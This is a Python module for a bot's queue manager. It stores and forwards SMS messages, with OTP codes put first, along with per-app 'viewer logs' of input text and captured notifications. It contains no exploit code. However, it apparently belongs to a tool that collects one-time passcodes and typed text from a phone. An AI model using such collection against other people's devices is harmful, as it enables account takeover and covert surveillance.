import logging
from datetime import datetime
from bot.database.db_manager import db
from bot.utils.duplicate_filter import duplicate_filter

logger = logging.getLogger(__name__)

# ─────────────────────────────────────────
# PRIORITY QUEUE MANAGER CLASS
# ─────────────────────────────────────────
class PriorityQueueManager:
    def __init__(self):
        self.otp_priority = 2
        self.normal_priority = 1

    # ─────────────────────────────────────────
    # ADD SMS TO PRIORITY QUEUE
    # ─────────────────────────────────────────
    def add_sms(self, sender: str, message: str, timestamp: str) -> dict:
        try:
            sms_id = duplicate_filter.generate_sms_id(sender, message, timestamp)

            if duplicate_filter.is_duplicate_sms(sms_id):
                logger.info(f"Duplicate SMS skipped: {sms_id}")
                return {"success": False, "reason": "duplicate", "sms_id": sms_id}

            is_priority = self.otp_priority if duplicate_filter.is_otp_message(message) else self.normal_priority

            db.insert_sms(sms_id, sender, message, timestamp, is_priority)
            db.add_to_sms_queue(sms_id, sender, message, timestamp, is_priority)
            duplicate_filter.mark_sms_seen(sms_id)

            return {
                "success": True,
                "sms_id": sms_id,
                "is_priority": is_priority,
                "is_otp": is_priority == self.otp_priority
            }
        except Exception as e:
            logger.error(f"Add SMS to queue error: {e}")
            return {"success": False, "reason": str(e)}

    # ─────────────────────────────────────────
    # GET NEXT SMS FROM QUEUE (priority order)
    # ─────────────────────────────────────────
    def get_next_sms_batch(self) -> list:
        try:
            queue = db.get_sms_queue()
            priority_items = [item for item in queue if item["is_priority"] == self.otp_priority]
            normal_items = [item for item in queue if item["is_priority"] == self.normal_priority]
            return priority_items + normal_items
        except Exception as e:
            logger.error(f"Get next SMS batch error: {e}")
            return []

    # ─────────────────────────────────────────
    # MARK SMS DELIVERED FROM QUEUE
    # ─────────────────────────────────────────
    def mark_sms_delivered(self, sms_id: str) -> bool:
        try:
            db.remove_from_sms_queue(sms_id)
            db.mark_sms_delivered(sms_id)
            return True
        except Exception as e:
            logger.error(f"Mark SMS delivered error: {e}")
            return False

    # ─────────────────────────────────────────
    # MARK SMS RETRY
    # ─────────────────────────────────────────
    def mark_sms_retry(self, sms_id: str) -> bool:
        try:
            db.increment_sms_queue_retry(sms_id)
            return True
        except Exception as e:
            logger.error(f"Mark SMS retry error: {e}")
            return False

    # ─────────────────────────────────────────
    # ADD VIEWER LOG TO QUEUE
    # ─────────────────────────────────────────
    def add_viewer_log(self, app_name: str, input_text: str, timestamp: str) -> bool:
        try:
            db.insert_viewer_log(app_name, input_text, timestamp)
            db.add_to_viewer_queue(app_name, input_text, timestamp)
            return True
        except Exception as e:
            logger.error(f"Add viewer log error: {e}")
            return False

    # ─────────────────────────────────────────
    # ADD NOTIFICATION TO QUEUE
    # ─────────────────────────────────────────
    def add_notification(self, notif_id: str, app_name: str, title: str, content: str, timestamp: str) -> bool:
        try:
            db.insert_notification(notif_id, app_name, title, content, timestamp)
            db.add_to_notification_queue(notif_id, app_name, title, content, timestamp)
            return True
        except Exception as e:
            logger.error(f"Add notification error: {e}")
            return False

    # ─────────────────────────────────────────
    # GET FULL QUEUE STATUS
    # ─────────────────────────────────────────
    def get_queue_status(self) -> dict:
        try:
            return db.get_full_queue_status()
        except Exception as e:
            logger.error(f"Get queue status error: {e}")
            return {"sms_queue": 0, "viewer_queue": 0, "notification_queue": 0, "total": 0}

    # ─────────────────────────────────────────
    # CLEAR ALL QUEUES
    # ─────────────────────────────────────────
    def clear_all_queues(self) -> bool:
        try:
            with db.get_connection() as conn:
                conn.execute("DELETE FROM sms_queue")
                conn.execute("DELETE FROM viewer_queue")
                conn.execute("DELETE FROM notification_queue")
                conn.commit()
            logger.info("All queues cleared")
            return True
        except Exception as e:
            logger.error(f"Clear all queues error: {e}")
            return False


# ─────────────────────────────────────────
# SINGLETON INSTANCE
# ─────────────────────────────────────────
priority_queue = PriorityQueueManager()
